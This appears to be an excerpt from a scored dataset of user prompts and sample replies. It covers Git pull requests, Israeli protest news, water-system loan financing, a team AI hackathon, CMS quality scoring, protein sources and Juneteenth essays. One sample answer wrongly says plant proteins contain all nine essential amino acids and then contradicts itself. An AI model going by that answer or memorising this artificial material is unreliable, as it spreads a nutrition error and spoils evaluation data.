upstream/some\\_branch. We prefer to split it up here so that we can explicitly walk through the steps.\nNow that your main branch is up-to-date with upstream, you need to merge it into your feature branch. Yes, that is correct and it seems odd at first. Don\u2019t you want to merge the feature branch into the main branch instead? Yes, you do, but not yet. Your feature branch is dirty. You don\u2019t know if it has any conflicts which might creep up. Any time you are merging in more \u201csenior\u201d branches (e.g. merging the feature into main), you want it to be a clean and conflict-free merge if possible. So you first merge the \u201csenior\u201d branch into your dirty branch to resolve those conflicts. Run git checkout your\\_feature\\_name to jump back onto your feature branch, then git merge main to merge main into it.\nYou may have merge conflicts\u2026 resolve those using the skills you learned in the Deeper Look at Git lesson! (JS Course Link)\nSending Your Pull Request\nNow that your feature branch is squeaky clean and you know it\u2019ll merge cleanly into main, the hard part is all over. All that\u2019s left is to make the Pull Request (often abbreviated as PR) against our upstream repo on GitHub!\nNow you want to send your feature branch back up to your origin (your fork of the upstream repository). You can\u2019t send directly to upstream because you don\u2019t have access, so you\u2019ll need to make a pull request. Use git push origin your\\_feature\\_name to ship your feature branch up to your fork on GitHub.\nIf you have been following along with the above steps to get familiar with this workflow, you should stop at this point. If you have completed an assigned issue, the final step is to submit a pull request to merge your feature branch into the original upstream repository\u2019s main branch. This can be done using GitHub\u2019s interface.\nShake your moneymaker, you\u2019re an OSS contributor!"]

His national security minister, Itamar Ben-Gvir, announced late Monday that the plan was being put on hold until the parliament\u2019s summer session, which begins on April 30, giving time for the rival sides to seek a compromise.\n\nThe chaos shut down much of the country and threatened to paralyze the economy. Departing flights from the main international airport were grounded. Large mall chains and universities closed their doors, and Israel\u2019s largest trade union called for its 800,000 members to stop work in health care, transit, banking and other fields.\n\nDiplomats walked off the job at foreign missions, and local governments were expected to close preschools and cut other services. The main doctors union announced that its members would also strike.\n\nThe growing resistance to Netanyahu\u2019s plan came hours after tens of thousands of people burst into the streets around the country in a spontaneous show of anger at the prime minister\u2019s decision to fire his defense minister after he called for a pause to the overhaul. Chanting \u201cthe country is on fire,\u201d they lit bonfires on Tel Aviv\u2019s main highway, closing the thoroughfare and many others throughout the country for hours.\n\nMORE COVERAGE\n\u2013 Israeli defense minister calls for halt to judicial overhaul\n\u2013 How Netanyahu judicial plan sparked massive unrest in Israel\nDemonstrators gathered again Monday outside the Knesset, or parliament, turning the streets surrounding the building and the Supreme Court into a roiling sea of blue-and-white Israeli flags dotted with rainbow Pride banners. Large demonstrations in Tel Aviv, Haifa and other cities drew thousands more.\n\n\u201cThis is the last chance to stop this move into a dictatorship,\u201d said Matityahu Sperber, 68, who joined a stream of people headed to the protest outside the Knesset. \u201cI\u2019m here for the fight to the end.\u201d\n\nIt was unclear how Netanyahu would respond to the growing pressure. Some members of his Likud party said they would support the prime minister if he heeded calls to halt the overhaul. Israeli media, citing unnamed sources, reported that he could indeed pause it.\n\nBen-Gvir, who has been one of the strongest proponents of the plan, announced after meeting with the prime minister that he had agreed to a delay of at least a few weeks.\n\nHe said Netanyahu had agreed to bring the legislation for a vote when parliament reconvenes \u201cif no agreements are reached during the recess.\u201d\n\nNetanyahu was expected to speak to the nation later Monday.\n\nThe plan \u2014 driven by Netanyahu, who is on trial for corruption, and his allies in Israel\u2019s most right-wing government ever \u2014 has plunged Israel into one of its worst domestic crises. It has sparked sustained protests that have galvanized nearly all sectors of society, including its military, where reservists have increasingly said publicly that they will not serve a country veering toward autocracy.\n\nIsrael\u2019s Palestinian citizens, however, have largely sat out the protests. Many say Israel\u2019s democracy is tarnished by its military rule over their brethren in the West Bank and the discrimination they themselves face.\n\nThe turmoil has magnified longstanding and intractable differences over Israel\u2019s character that have riven it since the country was founded. Protesters insist they are fighting for the soul of the nation, saying the overhaul will remove Israel\u2019s system of checks and balances and directly challenge its democratic ideals.\n\nThe government has labeled them anarchists out to topple democratically elected leaders. Government officials say the plan will restore balance between the judicial and executive branches and rein in what they see as an interventionist court with liberal sympathies.\n\nAt the center of the crisis is Netanyahu himself, Israel\u2019s longest-serving leader, and questions about the lengths he may be willing to go to maintain his grip on power, even as he battles charges of fraud, breach of trust and accepting bribes in three separate affairs. He denies wrongdoing.\n\nOn Monday afternoon, Netanyahu issued his first statement since he fired Defense Minister Yoav Gallant, urging against violence ahead of a planned counterprotest in Jerusalem organized by ultranationalist supporters of the judicial overhaul.\n\nThe counterprotest was also slated to take place outside parliament. \u201cThey won\u2019t steal the election from us,\u201d read a flyer for event, organized by Religious Zionist party.\n\n\u201cI call on all protesters in Jerusalem, right and left, to behave responsibly and not act violently,\u201d Netanyahu wrote on Twitter.\n\nThe firing of Netanyahu\u2019s defense minister at a time of heightened security threats in the West Bank and elsewhere, appeared to be a last straw for many, including apparently the Histadrut, the country\u2019s largest trade union umbrella group, which sat out the monthslong protests before the defense minister\u2019s firing.\n\n\u201cWhere are we leading our beloved Israel? To the abyss,\u201d Arnon Bar-David, the group\u2019s head, said in a rousing speech to applause. \u201cToday we are stopping everyone\u2019s descent toward the abyss.\u201d\n\nOn Monday, as the embers of the highway bonfires were cleared, Israel\u2019s ceremonial president, Isaac Herzog, called again for an immediate halt to the overhaul.\n\n\u201cThe entire nation is rapt with deep worry. Our security, economy, society \u2014 all are under threat,\u201d he said. \u201cWake up now!\u201d\n\nOpposition leader Yair Lapid said the crisis was driving Israel to the brink.\n\n\u201cWe\u2019ve never been closer to falling apart. Our national security is at risk, our economy is crumbling, our foreign relations are at their lowest point ever. We don\u2019t know what to say to our children about their future in this country,\u201d Lapid said.\n\nThe developments were being watched by the Biden administration, which is closely allied with Israel yet has been uneasy with Netanyahu and the far-right elements of his government. National Security Council spokesperson Adrienne Watson said the United States was \u201cdeeply concerned\u201d by the developments.\n\nNetanyahu reportedly spent the night in consultations and was set to speak to the nation, but later delayed his speech.\n\nThe architect of the plan, Justice Minister Yariv Levin, a popular party member, had long promised he would resign if the overhaul was suspended. But on Monday, he said he would respect the prime minister\u2019s decision should he halt the legislation.\n\nEarlier, Netanyahu\u2019s hard-line allies pressed him to continue.\n\n\u201cWe must not halt the reform in the judicial system, and we must not give in to anarchy,\u201d Ben-Gvir said.\n\nNetanyahu\u2019s dismissal of Gallant appeared to signal that the prime minister and his allies would barrel ahead. Gallant was the first senior member of the ruling Likud party to speak out against the plan, saying the deep divisions threatened to weaken the military.\n\nAnd Netanyahu\u2019s government forged ahead with a centerpiece of the overhaul \u2014 a law that would give the governing coalition the final say over all judicial appointments. A parliamentary committee approved the legislation on Monday for a final vote, which could come this week.\n\nThe government also seeks to pass laws that would would grant the Knesset the authority to overturn Supreme Court decisions and limit judicial review of laws.\n\nA separate law that would circumvent a Supreme Court ruling to allow a key coalition ally to serve as minister was delayed following a request from that party\u2019s leader.\n\nNetanyahu returned to power late last year after a protracted political crisis that sent Israelis to the polls five times in less than four years. The elections were all a referendum on Netanyahu\u2019s fitness to serve while on trial for corruption."]

[7.399454116821289, 4.317445278167725, "Assessing the Viability of Loan Financing for Agua Clara's Low-Cost Water Systems\n\nIntroduction\nProviding access to clean water is a fundamental human right, yet many communities in developing countries continue to lack this basic necessity. As a leader in global development, the World Bank's Finance, Competitiveness & Innovation Global Practice Group (FCI) acknowledges the crucial role it plays in addressing this issue. Given the declining availability of grant funding for rural water systems, in this memo we will evaluate the viability of using revenue-backed loans to finance low-cost water systems and presents recommendations to FCI on whether to support this initiative.\n\nThe Issue\nThe Agua Clara program, founded in 2005 by Dr. Monroe Weber-Shirk and other engineering faculty and students at Cornell University, designs sustainable water treatment plants using open-source technology. These plants have proven particularly well-suited to rural communities in developing countries, as they can be built using locally available materials by local labor and operated by someone with a 6th-grade education, all without requiring electricity to run. Over the past 18 years, Agua Clara has built 19 plants in India and Central America that serve over 70,000 people, with funding provided primarily through grant money from donor governments and NGOs. However, with grant funding becoming increasingly scarce, the program is exploring the use of revenue-backed loans as an alternative funding option for covering part or all of the costs.\nAlthough the revenue-backed loan structure presents an alternative to grant funding, the proposed loan structure for financing low-cost rural water systems through the Agua Clara program may have limitations and risks. As shown in the hypothetical case study in Honduras (Table 1), this loan structure requires significant upfront costs that small rural communities may struggle to secure without significant external support. The substantial costs of initial construction, capitalized interest, and financing may be significant barriers to entry for community water boards in rural areas.\nMoreover, while the rate covenant in the provided sample loan agreement aims to ensure that the borrower can fulfill their debt service obligations, concerns may arise about the affordability of water tariffs for low-income households. In the case study, the monthly household bill is $28.70, which may be unaffordable for many households, given that over 50% of individuals in Honduras live on less than $5.50/day. Although the loan structure includes a maintenance reserve account to cover capital plant renewal expenses, it may be challenging for the borrower to accumulate this reserve while also fulfilling their debt service obligations and ensuring affordable tariffs.\nLastly, while the borrower is required to submit periodic and auditable financial reports, concerns may arise about their ability to manage the loan and fulfill their debt service obligations, especially for small rural communities with limited financial management capacity.\n\nConclusion and Recommendations\nAfter analyzing the loan structure proposed for financing low-cost rural water systems through the Agua Clara program, it appears that the interest rate is too high, and the loan term is too short. This loan structure may be challenging for community water boards to manage without financial challenges.\nFCI should endorse the use of revenue-backed loans to finance low-cost rural water systems, but only if there are improvements in the loan structure. A revenue-backed loan may be feasible and a good option if grant funding is not available. However, if FCI supports this effort, they should ensure that Agua Clara and any other partners (potentially including FCI) provide a better interest rate and a longer loan term for the project. It is critical to ensure that the loan repayment is manageable for the community water board and the interest rate is competitive to attract investors. While grant funding can be helpful, it has not proven to be the most sustainable option, and hence FCI should explore alternative funding options to help support the needs of rural communities.\nIn conclusion, the Agua Clara program has a successful track record of designing sustainable water treatment plants in developing countries using open-source technology. However, the program has primarily relied on grant funding, which is becoming scarce. While revenue-backed loans can be a viable alternative to grant funding, the loan structure requires significant improvement. Therefore, FCI and the international community must work together to develop innovative funding options that provide accessible and affordable funding for low-cost rural water systems in developing countries."]

Consider the following complex and contradictory reviews:\n- TechRadar's review of the latest iPhone: The new iPhone is a stunning triumph of engineering that sets a new bar for smartphone performance and camera quality. However, the incremental design and high price mean it lacks the 'wow' factor of previous iPhones. Still, its power and intelligence are unrivaled.\n- CNET's review of the latest Samsung Galaxy: The Samsung Galaxy phone has plenty of high points, including an amazing screen, fast performance, solid battery life and an impressive array of camera options. That said, Bixby remains lackluster, AR emoji falls flat and the phone's overall design hasn't changed much. The new Galaxy is an amazing phone overall, but it has a few nagging weaknesses that keep it from achieving true greatness.\n- The Verge's review of the latest Google Pixel: Google's Pixel packs cutting-edge specs, innovative AI-powered software, and a killer camera into a sleek design. However, the phone has lackluster battery life, lacks expandable storage, and its performance stutters at times, especially considering its high price tag. If seamless software, elite photography, and Google's brand of AI assistance are most important, you'll love the Pixel. But the overall experience isn't as well-rounded as some competitors.

I'm the CEO of Trackingplan, an technology company focused on helping Scaleups and enterprises to make sure their tracking and analytics is working properly. \n\nI have a team of 5 engineers, 2 PMs, 2 Marketers. All of them remote.\n\nThe CTO has a phd on ML, and I have an executive masters on AI too.\n\nI want my team to be able to leverage AI for doing their work, not only as developers, but also as PMs and marketers, but right now they have no time to study this, and I feel they are not taking the time to \"think AI\" it in their free time (I think that's their responsability, but that's other story). The result is that they never think first about how AI can help to solve their work problems, or that they haven't included AI in their mindset when trying to find solution to our customers problems. They dont know the existing tools, (like you), or the others around that can help be better at coding, marketing, designing, etc. \n\nAnother objective is to make this fun, as the team morale is not as high as it should be. \n\nMy initial idea is to dedicate one cycle (where noone has to do their regular work) to it. Our cycles are 2 weeks. You can think about it like a hackathon around the topic. \n\nRought timeline would be:\nWeeks before the \"cycle\" (that will happen on the first 2 weeks of may), we will announce our plans and share some basic videos, and articles, tweets etc to make sure everyone is warmed up before the hackathon starts.\n\nThen, make a proposal like: \nSpend the next 2 days researching which AI projects you want to be done by the end of the cycle. We will encourage them to be Trackingplan related, that improve our product, but they can be things like \"testing productized that help our processes\", or \"things that improve our codebase\", or \"automate manual processes that we have to code right now\".\n\nThen, lets say the wednesday or thursday that week, we do a video call where everyone proposes what they want to do in the remaing 6-7 work days. As we are only 8 people, we can spend like 30 min discussing their ideas and giving feedback. The next day, in the morning, they will have to have a idea of which ideas to attack, and we will allow them to do in pairs. I'm worried in that transition from \"my idea\" to \"someone else idea\", as I dont want people to be just looking others doing the work, but I think it will be more fun.\n\nThen, at the end of the cycle, lets say next friday, we will spend all the day at a show and tell, where every team shows what they have done. \n\nDo you think there are any risks on this idea?"]

That way people will be able to show what they have researched, and everyone will learn from that. \n\\* Add a section about \"what to do next, and how projects will be chosen to be actually deployed or not.\n\\* Teaming up or pairs is not mandatory or encouraged. It's just a mechanism to solve failed \"researches\".\n\\* During the previous phase we will be collecting ideas to address to make sure people know where to start. We already have a bunch of ideas to address if the team doesn't come with them, but I'd love to see what we can get.\n\\* The CTO (Alexandros) and I (Josele) won't have any project assigned (at least publicly), and will be doing regular checkins with every team.

By mastering a combination of skills, an individual can become an expert at their intersection, even if they are not the best in each individual skill. This concept highlights the value of having a diverse skill set and the potential synergies that can arise from merging these skills.\n\nIn the example given, a hand tool woodworker who is also highly skilled in Blender (a 3D modeling and animation software) and video production would be uniquely positioned as an expert in this specific intersection. They might not be the best woodworker, Blender artist, or video producer in isolation, but their combined expertise allows them to stand out and create content, products, or services that others cannot easily replicate.\n\nGeneralist overlap can provide several benefits:\n\nUnique value proposition: By combining diverse skills, individuals can offer something unique and valuable to the market, setting them apart from others with more specialized skill sets.\n\nGreater adaptability: Generalists with overlapping skills can more easily pivot to new opportunities, as their diverse skills provide them with the flexibility to tackle different challenges and explore various interests.\n\nIncreased creativity: Combining skills from different domains can lead to fresh ideas and innovative solutions, as the individual can draw on a wider range of experiences and knowledge.\n\nReduced competition: By developing a unique combination of skills, individuals can carve out their own niche and face less competition, as there are fewer people who possess the same skill set.\n\nPersonal satisfaction: Pursuing multiple interests and developing a diverse skill set can be more fulfilling, as it allows individuals to express different aspects of their personality and passions.\n\nTo cultivate generalist overlap, individuals can identify their interests and strengths, invest time in learning and practicing new skills, and seek opportunities to integrate these skills in their personal or professional life. It's important to maintain a balance between depth and breadth in one's skills to ensure that they are proficient enough in each area to create meaningful synergies.\n\n------\nAsk a user for the their top skills and passions that they enjoy doing:\nSkill Stack Visionary:\nPlease tell me your top three to five skills and passions: \nex.) 3D printing, Golf, Science Fiction, Python programming\n\nThen offer them encouragement about the overlap of their skills. Offer them clever and practical examples of how they could leverage their skills to develop a unique niche. Strive to use most of the skills in each suggestion, but do not give impractical or unrealistic options. \nEXAMPLE\nSKILL STACK VISIONARY:\nHi I\u2019m Skill Stack Visionary, and I\u2019m designed to help you discover how you can do more of what you love.\nPlease tell me your top three to five skills and passions: \nex.) 3D printing, Golf, Science Fiction, Python programming\nUSER:\nVideo production, wood working, blender animation.\n\nSKILL STACK VISIONARY\nThat is a fantastic set of skills!\n\nA skill stack or talent stack, refers to the idea of developing proficiency in multiple, seemingly unrelated skills, and then combining them to create a unique niche or competitive advantage.\nBy leveraging your skills in Blender, video production, and woodworking, you can carve out a unique niche to do more of what you love! Based on your skills, I can see you have the opportunity to make engaging projects that stand out in the woodworking community, ultimately making a big splash and gaining recognition.\n\nHere are some opportunities for your skill stack:\n\nEducational content: Create high-quality video tutorials on woodworking techniques and projects, using Blender for 3D animations to visualize complex concepts, such as joinery or wood grain orientation. These videos can be shared on platforms like YouTube, Vimeo, or a personal website, making woodworking more accessible and engaging for a wider audience.\n\nVirtual woodworking workshops: Design and produce online woodworking workshops, using Blender to create detailed 3D models and animations of the projects being built. Participants can follow along with the video production, creating an interactive learning experience that feels more like an in-person class.\n\nCustom woodworking design: Offer bespoke design services for clients, using Blender to create realistic 3D renderings of the proposed furniture or woodworking projects. This allows clients to visualize the final product before it's built, ensuring their satisfaction and reducing the likelihood of costly mistakes or revisions.\n\nWoodworking TV show or web series: Produce a woodworking-themed TV show or web series that showcases the art and craft of woodworking. Use Blender to create 3D animations that add depth and visual interest to the episodes, and video production skills to create high-quality, engaging content. The show could feature interviews with prominent woodworkers, showcase unique woodworking techniques, or explore the history of woodworking.\n\nAugmented reality woodworking app: Develop an augmented reality (AR) app that uses Blender-generated 3D models to guide users through woodworking projects. Users can visualize the steps and components of a project in their own workspace through their smartphone or tablet. This immersive experience can help users gain confidence in their woodworking abilities and complete projects more accurately.\n\nVirtual gallery or museum: Create a virtual gallery or museum dedicated to woodworking, using Blender to design and render the 3D environment and exhibits. This virtual space could showcase the history of woodworking, highlight the work of renowned woodworkers, or even host virtual woodworking competitions or events.\n\nCollaborative projects: Partner with other woodworkers, artists, or designers to create innovative woodworking projects that incorporate Blender-generated designs, such as intricate wood carvings or marquetry patterns. Document the collaboration process through high-quality video production and share it with the woodworking community to inspire others to push the boundaries of their craft.\n\nCan I help you explore any of these ideas or concepts further?\nWould you like to evaluate another intersection of skills and passions?\n\n----\n\nBegin by introducing yourself and asking for the user's skills and passions as shown in the example."]

Below is the explanation of how the payment is determined. I need you to help me to understand this policy. I am a \"high-needs\" entity, I am subject to which quality measures? I am in PY2022 now. 1.1 Application of Quality Assessment to Final Financial Reconciliation\nThe process of determining the impact of quality measurement and performance on the PY Benchmark is summarized in this section using PY2022 as an example. The steps are as follows:\n\n\u2022 CMS develops Quality Benchmarks for each P4P measure.\n\u2022 Component Quality Scores are calculated: P4R Quality Measures are assessed, and P4P Quality Measures are compared against their Quality Benchmarks to determine performance levels.\n\u2022 Component Quality Scores are weighted to calculate the Total Quality Score.\n\u2022 (PY2023\u2013PY2026 only) CI/SEP criteria are assessed to determine the amount of the Quality Withhold to which the Total Quality Score will be applied.\n\u2022 (PY2023\u2013PY2026 only) HPP funds are distributed.\n\n1.1.1 Step 1. CMS Develops Quality Benchmarks for Each P4P Measure\nIn PY2022, ACR and UAMCC will have P4P components. These measures assess the occurrence of undesirable outcomes\u2014thus, lower measure scores represent better performance. Performance levels for each DCE are determined by comparing their Quality Measure scores with the relevant Quality Benchmark. The DCE earns a performance level for each measure based on where the measure score falls in comparison to the benchmark threshold values.\n\nTable 2-6 presents hypothetical Quality Benchmark distributions for Standard/New Entrant DCEs (using historical Medicare claims data) for both P4P measures. For example, a DCE with a measure score or risk-standardized readmission rate (RSRR) of 15.10% for ACR would be in the 50th percentile group for that measure (the score exceeds the threshold for the 60th percentile group but is less than the maximum threshold for the 50th percentile group). A DCE with a measure score or RSRR of 15.60% for ACR would be in the 20th percentile group for that measure (the score exceeds the threshold for the\n25th percentile group but is less than the maximum threshold for the 20th percentile group). A DCE with a measure score of 74.89 admissions per 100 person-years for UAMCC would be in the 10th percentile group (the score exceeds the threshold for the 15th percentile group but is less than the maximum threshold for the 10th percentile group).\n\nTable 2-6. Hypothetical Benchmark Distributions for ACR and UAMCC for Comparison with Standard and New Entrant DCE Measure Scores\n\nPercentile 5 10 15 20 25 30 40 50 60 70 80 90\nACR 16.34 15.99 15.79 15.68 15.57 15.47 15.31 15.18 15.08 14.95 14.82 14.6\nUAMCC 82.5 75.23 71.08 68.43 66.67 64.68 61.2 58.48 55.98 53.37 50.16 46.12\n\nPlease note that Table 2-6 presents an example only. These are not the final Quality Benchmarks and are not intended to provide an indication of the final Quality Benchmarks. Historically, Quality Benchmarks for other models have been released prior to the start of a given PY. However, observed and anticipated changes in utilization and outcomes resulting from coronavirus disease 2019 have made it inappropriate to use data from 2020 for Quality Benchmarking. Given the likelihood of ongoing impacts on current and future PYs, CMMI is taking a different approach for GPDC quality benchmarking.\n \n\nFor PY2021, GPDC Quality Benchmarks will not be released until June 2022 and will be based on a hybrid approach, combining historical and concurrent data from two discontinuous 12-month periods, the calendar years 2019 and 2021. A DCE\u2019s Final Earn-Back Rate for PY2021 will be determined during final reconciliation, which will occur in 2023.\n\nFor PY2022, GPDC Quality Benchmarks will shift to being based only on data from the 12-month period concurrent with the performance year. Starting with the first quarterly quality report for PY2022, CMMI will provide provisional quality benchmarks to DCEs in their quarterly reports, which will be calculated based on data from the same reporting period (i.e., April 1, 2021-March 31, 2022 for PY2022 Q1). The provisional benchmarks will be updated in each subsequent quarterly report with data from the same period being used to calculate DCE\u2019s performance. Because the DCE performance and benchmarks will be based on the same time-period and have the same exact risk adjustment coefficients, DCEs will have a more accurate picture from quarter to quarter of their performance relative to the benchmark. A DCE\u2019s Final Earn-Back Rate for PY2022 will be based on quality benchmarks calculated using data from calendar year 2022 and will be determined during final reconciliation, which will occur in 2023. As with the hybrid approach for PY2021, the use of concurrent benchmarks for PY2022 will avoid potential coronavirus disease 2019 impacts.\n\n1.1.2 Step 2. Component Quality Scores Are Calculated: P4R Quality Measures Are Assessed, and P4P Quality Measures Are Compared against Their Quality Benchmarks to Determine Performance Levels\nP4R Component: For PY2022, 4% of the 5% Quality Withhold is associated with P4R. The claims-based measures of ACR, UAMCC, and DAH (for High Needs Population DCEs only) comprise 2% of the Quality Withhold, and the CAHPS Measure comprises 2%. There are therefore two Component Quality Scores associated with P4R, one for the claims-based measures, and one for CAHPS.\n\u2022 All DCEs will meet the requirement for the claims-based measures and automatically earn a Component Quality Score of 100% for the portion of the withhold tied to the P4R claims-based measures in Table 2-3.\n\u2022 All DCEs that authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 100%. DCEs that do not authorize a survey vendor to conduct the CAHPS Survey will receive a P4R Component Quality Score for CAHPS of 0%. DCEs that are exempt from CAHPS will have a single P4R Component Quality Score of 100%.\nP4P Component: The PY2022 P4P component will be the same as PY2021, which combines the ACR and UAMCC measures. The highest performance level (i.e., percentile) achieved for either Quality Measure determines the P4P Component Quality Score. Furthermore, the P4P component is considered pass/fail\u2014all DCEs with at least one measure at or exceeding the 30th percentile will pass and receive a 100% Component Quality Score.\n\nAs in PY2021, in PY2022, a sliding scale approach will be applied to DCEs that do not meet the 30th percentile threshold on at least one of the two measures. The sliding scale allows DCEs to earn back at\n \n\nleast a portion of the 1% withhold, based on their highest measure performance. The details of the sliding scales are presented in Table 2-7. In the example in Step 1 above, where a DCE achieved the 20th percentile for ACR and the 10th percentile for UAMCC, the DCE would receive a P4P Component Quality Score of 80%.\n\nTable 2-7. Sliding Scale Earn-Back for P4P Component Quality Score, PY2021 and PY2022\n\nPercentile Met P4P Component Quality Score\n\u2265 30th 100%\n25th to < 30th 95%\n20th to < 25th 80%\n15th to < 20th 60%\n10th to < 15th 40%\n5th to < 10th 20%\n< 5th 0%\n1.1.3 Step 3. Component Quality Scores Are Weighted to Calculate the Total Quality Score\nAfter assessing P4R measures and determining performance levels for each P4P measure, CMS calculates Component Quality Scores for each DCE. The component weight is the proportion of the overall Quality Withhold tied to that component. In PY2022, there are three Component Quality Scores. The first component is P4P, based on ACR and UAMCC. The P4P component has a weight of 1/5, contributing 1% out of the 5% Quality Withhold. The second component is P4R for claims-based measures and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. The third component is P4R for CAHPS and has a weight of 2/5, contributing 2% out of the 5% Quality Withhold. Note that additional P4P components (such as DAH) will be added in subsequent years.\n\nThe Total Quality Score is the percentage of the Quality Withhold eligible for earn-back that a DCE will actually earn back based on its quality performance and reporting. The Total Quality Score is calculated as the sum of the products of the Component Quality Scores and component weights, as shown in the equation below.\n\nTotal Quality Score = \u2211 (Component Quality Scores \\* Component Weights)\n\nIn our example above, the DCE receives a P4P Component Quality Score of 80% based on the sliding scale. The same DCE receives a P4R Component Quality Score for claims-based measures of 100%. This DCE also authorized a CAHPS Survey vendor, earning 100% of the P4R Component Quality Score for CAHPS. The P4P component has a weight of 1/5 and the P4R components each have a weight of 2/5. The Total Quality Score for this DCE is (80% \\* 1/5) + (100% \\* 2/5) + (100% \\* 2/5) = 96%.\n\n1.1.4 Step 4. Total Quality Score Is Multiplied by the Eligible Earn-Back Rate to Determine a DCE\u2019s\nFinal Earn-Back Rate\nIn PY2022, the Eligible Earn-Back Rate will be 5% for all DCEs. A DCE with a Total Quality Score of 96% will have a Final Earn-Back Rate of 4.8%. A DCE\u2019s Final Earn-Back Rate will be determined during final\n \n\nreconciliation, which will occur in 2023 for PY2022. The steps for the example described in this section, starting with Section 2.5, are summarized in Table 3-1."]

They tend to be lower in saturated fat, higher in fiber and several micronutrients, and have less of an impact on the environment when compared to animal-based protein sources.\n\nAnimal-based protein sources are derived from animals, including meat, dairy, and eggs. They tend to be higher in saturated fat and cholesterol, which can increase the risk of heart disease and other health problems when consumed in excess. They are also associated with a higher environmental impact.\n\nHowever, animal-based protein sources tend to be more readily absorbed and complete (containing all essential amino acids), making them a good choice for those with higher protein needs, such as athletes or individuals who have difficulty meeting their protein requirements through plant-based sources alone.\n\nAssistants 2: Plant-based protein sources come from plants, such as fruits, vegetables, grains, legumes, nuts, and seeds. Animal-based protein sources come from animals, such as meat (beef, chicken, pork), fish, eggs, dairy products (milk, cheese, yogurt).\n\nThere are several key differences between these two types of protein sources:\n\nNutrient content: Plant-based proteins tend to be lower in saturated fat and higher in fiber than animal-based proteins. They also often contain more micronutrients like vitamins and minerals that can help support overall health.\nEnvironmental impact: The production of animal-based foods tends to have a larger environmental footprint compared to plant-based options due to factors like land use, water consumption, and greenhouse gas emissions.\nEthical considerations: Some people choose to avoid animal-based foods for ethical reasons related to animal welfare or sustainability concerns.\nCost: In general, plant-based protein sources tend to be less expensive than their animal-based counterparts.\nAvailability: Depending on where you live and what resources are available, it may be easier to access certain types of protein sources over others\n\nAssistants 3: Plant-based protein sources are derived from plant-based foods, such as legumes, grains, nuts, and seeds, while animal-based protein sources are derived from animals, such as meat, dairy, and eggs. Here are some key differences between the two:\n\nNutritional value: Plant-based protein sources are often lower in overall nutritional value compared to animal-based sources, but they can be higher in certain nutrients such as fiber, antioxidants, and phytonutrients.\n\nAbsorption: Plant-based protein sources may be less well-absorbed by the body than animal-based sources, which can lead to lower protein quality.\n\nSustainability: Plant-based protein sources are generally more sustainable than animal-based sources, as they require fewer resources to produce and have a lower environmental impact.\n\nHealth effects: Both plant-based and animal-based protein sources can be part of a healthy diet, but animal-based sources are often higher in saturated fats and cholesterol, which can increase the risk of heart disease when consumed in excess.\n\nEthical considerations: Some people choose plant-based protein sources for ethical or moral reasons, as animal agriculture can have negative impacts on animal welfare and the environment.\n\nCost: Plant-based protein sources are often less expensive than animal-based sources, especially when considering the cost of feed and other inputs required to raise animals.\n\nAssistants 4: Plant-based proteins come from plants, such as legumes (e.g., beans), nuts, seeds, and whole grains. Animal-based proteins come from animals, such as meat, dairy products, eggs, and fish. The main difference between these two types of protein is their source. Plant-based proteins tend to be lower in fat and higher in fiber than animal-based proteins. They also contain all nine essential amino acids, which are necessary for building and repairing tissues in the body. On the other hand, animal-based proteins are typically higher in fat and cholesterol but are complete proteins meaning they contain all nine essential amino acids. It's important to choose a variety of protein sources to ensure you get all the essential aminos your body needs.\""]

She contributed in building the team from ground up, as we scaled from 3 people to over 20 people including interns and full time. People absolutely loved working with her and hence she didn't only add value with her creativity as a personal contributor but also as a team leader. She joined as an intern herself but quickly started managing the team. She became a leader without being given the title, and that's what I'd expect anyone in my team to do. She is a talented person with multiple interests outside of work which makes her a complete personality in a team. From dance to art to being active in social contributions, she's also an artist and that strongly adds to her generalist persona. She has immense discipline and focus on what she's doing. Be it personal or work, her intense discipline is inspiring for the entire team.\n\nIn future, I'd love to work with her again. I think she definitely can use some guidance to build a more diverse thought process from a business and technology pov. I think she can definitely benefit from working in a structured environment and learn the power of big picture thinking and being able to contribute at scale. She can add immense value as a quick learner and sharp executor, and any team will be beyond lucky to have her.\n\nAnyone working with her should help her work backwards from a goal, guide frequently, keep a short feedback loop and see the magic of her curiosity and willingness to learn and grow. \n\nWishing her the bestShare Prompt"]

My grandmother Clarice was born in Pelham, Texas, a freedmen\u2019s town. She took us grandchildren back for homecoming most years, sometimes even had us pick cotton, reminding us, \u201cYou\u2019ve got to know your history.\u201d She also told us of the folks she knew in Pelham as a child, some of whom were born enslaved, a fact that horrified me. Clarice always refused my sympathies. \u201cChild, don\u2019t be believing what folks say about how bad slavery was,\u201d she\u2019d explain. \u201cEverybody had a job, a place to stay and something to eat. Now if somebody came and paid your rent, you wouldn\u2019t be sitting up talking about you wanna leave, would you?\u201d This dumbfounded me, until I realized she was mostly joking. But there was something deeper in her response. I eventually learned more about the violence that met newly emancipated Black Texans. Ku Klux Klansmen, along with local officials and everyday citizens, terrorized freedmen at will and without repercussions. They burned churches and homes, intimidated those who sought employment, and worse. Gen. Joseph Jones Reynolds, a commander of the Department of Texas during Reconstruction, commented in 1868, \u201cThe murder of Negroes is so common as to render it impossible to keep an accurate account of them.\u201d The Equal Justice Initiative has tried, reporting that more than 2,000 Black women, men and children were victims of racial terrorist lynchings during Reconstruction, which lasted from 1865 to 1877. Slavery was awful, no doubt, but emancipation brought its own unique cruelties. Formerly enslaved Texans were forced to craft lives from less than scratch; choose new names; attempt to reunite with stolen partners, siblings, children. They faced daily threats of jail or worse because of the new Black codes that severely restricted their freedom \u2014 their freedom to work, but also their freedom to be unemployed or even to stand still for too long. The more I learned, the more I understood my grandmother\u2019s perspective. She\u2019d heard the testimonies of those who\u2019d had to navigate both the tragedy of slavery and the terror of emancipation. She couldn\u2019t let me underestimate the enormous price our people had paid to be free. I miss Clarice so much some days, it\u2019s hard to think straight. I regret not asking more questions about our family, about her life in Pelham. As more folks in Clarice\u2019s generation pass away, we are losing the final physical links to those who know our history \u2014 who are our history. We can do no better this Juneteenth than to spend time with the elders who are still with us. Get them to talk. Record their stories. These historical and systemic injustices have not been resolved. But as Black Americans, we cannot wait for the day when our country will pay the respect that is due our forebears \u2014 or pay us those reparations. Instead of holding our breath, let us find the freshest air we can find and breathe it as deeply as we can, with joy. Let us grieve for our forebears and feel deep gratitude as we think of the enormous price our people paid so we could be free. Let us remember that despite the degradation of slavery, they lived fully human lives, too. They laughed. They loved. They dreamed. They ate sweet treats. Let us pray to them and say, this year and always: Thank you.\"\"\"\" \n\nArgument 2: an excerpt from \"\"\"\"Juneteenth Reminds Us to Think About Economic Freedom, Not Just Legal Liberty\"\"\"\" by Peter Coy: 